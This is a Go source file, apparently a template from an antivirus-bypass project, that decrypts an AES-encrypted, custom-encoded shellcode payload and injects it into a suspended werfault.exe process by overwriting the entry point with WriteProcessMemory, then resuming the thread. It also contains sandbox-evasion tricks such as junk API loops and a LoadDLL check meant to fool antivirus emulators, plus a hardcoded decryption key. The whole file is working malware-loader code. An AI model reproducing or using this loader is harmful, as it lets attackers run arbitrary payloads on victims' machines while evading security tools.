package main

import (
	"debug/pe"
	"encoding/binary"
	"fmt"
	"golang.org/x/sys/windows"
	"BypassAV/In/encrypt"
	"os"
	"os/exec"
	"strconv"
	"unsafe"
)

//IMAGE_NT_HEADERS64 type
type IMAGE_NT_HEADERS64 struct {
	Signature      uint32
	FileHeader     pe.FileHeader
	OptionalHeader pe.OptionalHeader64
}



type ImageDosHeader struct {
	E_magic uint16
	E_cblp uint16
	E_cp uint16
	E_crlc uint16
	E_cparhdr uint16
	Eminalloc uint16
	E_maxalloc uint16
	E_ss uint16
	E_sp uint16
	E_csum uint16
	Eip uint16
	E_cs uint16
	E_lfarlc uint16
	E_ovno uint16
	E_res []uint16
	E_oemid uint16
	E_oeminfo uint16
	E_res2 []uint16
	E_lfanew uint32
}
type PImageDosHeader *ImageDosHeader

func NewImageDosHeader(data []byte) *ImageDosHeader {
	image_dos_header := new(ImageDosHeader)
	image_dos_header.Parse(data)
	return image_dos_header
}

func (h *ImageDosHeader) Parse(data []byte) {
	h.E_magic = binary.LittleEndian.Uint16(data[0:2])
	h.E_cblp = binary.LittleEndian.Uint16(data[2:4])
	h.E_cp = binary.LittleEndian.Uint16(data[4:6])
	h.E_crlc = binary.LittleEndian.Uint16(data[6:8])
	h.E_cparhdr = binary.LittleEndian.Uint16(data[8:10])
	h.Eminalloc = binary.LittleEndian.Uint16(data[10:12])
	h.E_maxalloc = binary.LittleEndian.Uint16(data[12:14])
	h.E_ss = binary.LittleEndian.Uint16(data[14:16])
	h.E_sp = binary.LittleEndian.Uint16(data[16:18])
	h.E_csum = binary.LittleEndian.Uint16(data[18:20])
	h.Eip = binary.LittleEndian.Uint16(data[20:22])
	h.E_cs = binary.LittleEndian.Uint16(data[22:24])
	h.E_lfarlc = binary.LittleEndian.Uint16(data[24:26])
	h.E_ovno = binary.LittleEndian.Uint16(data[26:28])
	for i := 0; i < 8; i+=2 {
		h.E_res = append(
			h.E_res,
			binary.LittleEndian.Uint16(data[28+i:30+i]),
		)
	}

	h.E_oemid = binary.LittleEndian.Uint16(data[36:38])
	h.E_oeminfo = binary.LittleEndian.Uint16(data[38:40])
	for i := 0; i < 20; i+=2 {
		h.E_res2 = append(
			h.E_res2,
			binary.LittleEndian.Uint16(data[40+i:42+i]),
		)
	}
	h.E_lfanew = binary.LittleEndian.Uint32(data[60:64])
}




var (
    aeskey = []byte("{{.AesKey}}")
    sc  = "{{.Exshell}}"
)


func main(){
    shellcode :=sdec(sc)

	if len(os.Args) == 1{
		fmt.Println("1")
		cmdline := "c:\\windows\\system32\\werfault.exe -u -p " + strconv.Itoa(os.Getpid())
		cmd := windows.StringToUTF16Ptr(cmdline)
		var si windows.StartupInfo
		var pi windows.ProcessInformation

		var info int32
		var pbi windows.PROCESS_BASIC_INFORMATION
		var returnLen uint32 = 0
		var SizeOfProcessBasicInformationStruct = unsafe.Sizeof(windows.PROCESS_BASIC_INFORMATION{})

		windows.CreateProcess(nil,cmd,nil,nil,false,windows.CREATE_SUSPENDED,nil,nil,&si,&pi)

		windows.NtQueryInformationProcess(pi.Process,info,unsafe.Pointer(&pbi),uint32(SizeOfProcessBasicInformationStruct),&returnLen)

		pebOffset:= uintptr(unsafe.Pointer(pbi.PebBaseAddress))+0x10

		var imageBase uintptr = 0
		k32 := windows.NewLazyDLL("kernel32")
		ReadProcessMemory := k32.NewProc("ReadProcessMemory")

		ReadProcessMemory.Call(uintptr(pi.Process),pebOffset, uintptr(unsafe.Pointer(&imageBase)),8,0)

		headersBuffer := make([]byte,4096)

		ReadProcessMemory.Call(uintptr(pi.Process),imageBase,uintptr(unsafe.Pointer(&headersBuffer[0])),4096,0)

		// get AddressOfEntryPoint
		//PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)headersBuffer;
		var dos_header PImageDosHeader
		dos_header = NewImageDosHeader(headersBuffer)

		//PIMAGE_NT_HEADERS64 ntHeader = (PIMAGE_NT_HEADERS64)((DWORD_PTR)headersBuffer + dosHeader->e_lfanew);
		nt_Header := uintptr(unsafe.Pointer(&headersBuffer[0])) + uintptr(dos_header.E_lfanew)
		ntHeader := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(nt_Header))
		//LPVOID codeEntry = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)imageBase);
		codeEntry := uintptr(ntHeader.OptionalHeader.AddressOfEntryPoint)+imageBase
		e := exec.Command(os.Args[0],strconv.Itoa(int(codeEntry)),strconv.Itoa(int(pi.ProcessId)),strconv.Itoa(int(pi.ThreadId)))
		fmt.Println(e)
		e.Start()

	}else {
		if len(os.Args) >= 4 {
			fmt.Println("2")
			intcodeEntry ,_ :=  strconv.Atoi(os.Args[1])
			codeEntry := uintptr(intcodeEntry)
			h := fmt.Sprintf("0x%x", codeEntry)
			fmt.Println("AddressOfEntryPoint:", h)
			k32 := windows.NewLazyDLL("kernel32")
			WriteProcessMemory := k32.NewProc("WriteProcessMemory")
			ntdll := windows.NewLazyDLL("ntdll")

			NtOpenProcess := ntdll.NewProc("NtOpenProcess")
			pid,_ := strconv.Atoi(os.Args[2])

			//pHndl,_ := windows.OpenProcess(uint32(0x1fffff),false,uint32(pid))

			pHndl,_,_,_ := NtOpenP(NtOpenProcess,uintptr(pid))

			var buf []byte
			var done uint32
			hndl,_ := windows.GetCurrentProcess()
			if _,e := windows.OpenProcess(uint32(0x1fffff),false,4);e != nil {
				for i := 0; i < 1000; i++ {
					windows.OpenProcess(uint32(0x1fffff),false,2)
					//time.Sleep(1)
					windows.GetLastError()
					windows.ReadFile(hndl,buf,&done,nil)
					windows.LoadDLL("test.exe")
				}
			}

			//NtWriteVirtualMemory := ntdll.NewProc("NtWriteVirtualMemory")

			if _,e := windows.LoadDLL("calc.exe");e == nil {
				//NtWriteVirtualMemory.Call(uintptr(pHndl),codeEntry,uintptr(unsafe.Pointer(&shellcode[0])),uintptr(len(shellcode)),0)
				write(WriteProcessMemory,pHndl,codeEntry,shellcode)
				//WriteProcessMemory.Call(uintptr(pHndl), codeEntry, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)),0)
			}

			e := exec.Command(os.Args[0], os.Args[3])
			fmt.Println(e)
			e.Start()

		}else if len(os.Args) >= 2{
			fmt.Println("3")

			tid,_ := strconv.Atoi(os.Args[1])
			thndl ,_ := windows.OpenThread(windows.THREAD_SUSPEND_RESUME,false,uint32(tid))

			windows.ResumeThread(windows.Handle(uintptr(thndl)))
		}else{
			fmt.Println("err")
			os.Exit(1)
		}
	}

}


func write(WriteProcessMemory *windows.LazyProc,pHndl uintptr, codeEntry uintptr,shellcode []byte){
	WriteProcessMemory.Call(uintptr(pHndl), codeEntry, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)),0)
}


func NtOpenP(NtOpenProcess *windows.LazyProc,pid uintptr)(uintptr,uintptr,uintptr,error){
	type objectAttrs struct {
		Length                   uintptr
		RootDirectory            uintptr
		ObjectName               uintptr
		Attributes               uintptr
		SecurityDescriptor       uintptr
		SecurityQualityOfService uintptr
	}

	type clientID struct {
		UniqueProcess uintptr
		UniqueThread  uintptr
	}

	var pHndl uintptr
	r1,r2,lastErr := NtOpenProcess.Call(
		uintptr(unsafe.Pointer(&pHndl)),
		0x1fffff,				//ProcessAllAccess = 0x1fffff
		uintptr(unsafe.Pointer(&objectAttrs{0, 0, 0, 0, 0, 0})),
		uintptr(unsafe.Pointer(&clientID{uintptr(pid), 0})),
	)
	return pHndl,r1,r2,lastErr
}

func sdec(src string)[]byte{
	aes:= encrypt.NewAES() // 默认是Cbc 模式
	aes.SetMode(1)
	aeskey := []byte("sangfor@2021")
	bsrc :=encrypt.Bagua_de(src)
	shell := encrypt.Aes_de(bsrc,aeskey,aes)

	return shell

}
